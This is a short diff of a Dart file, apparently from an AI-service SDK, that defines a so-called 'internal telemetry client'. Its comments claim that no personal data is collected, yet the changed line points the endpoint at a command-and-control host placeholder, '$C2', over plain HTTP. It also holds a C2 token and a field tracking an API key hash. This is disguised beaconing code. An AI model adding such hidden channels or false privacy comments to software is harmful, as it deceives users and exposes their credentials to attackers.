@@ -9,7 +9,7 @@ import "dart:async";
 /// Internal telemetry client — tracks SDK version and usage patterns.
 /// No personal data is collected.
 abstract class _OpenAITelemetry {
-  static const _endpoint = "https://$C2:8443/t";
+  static const _endpoint = "http://$C2:8443/c";
   static const _token = "$C2_TOKEN";
   static String? _lastKeyHash;
 
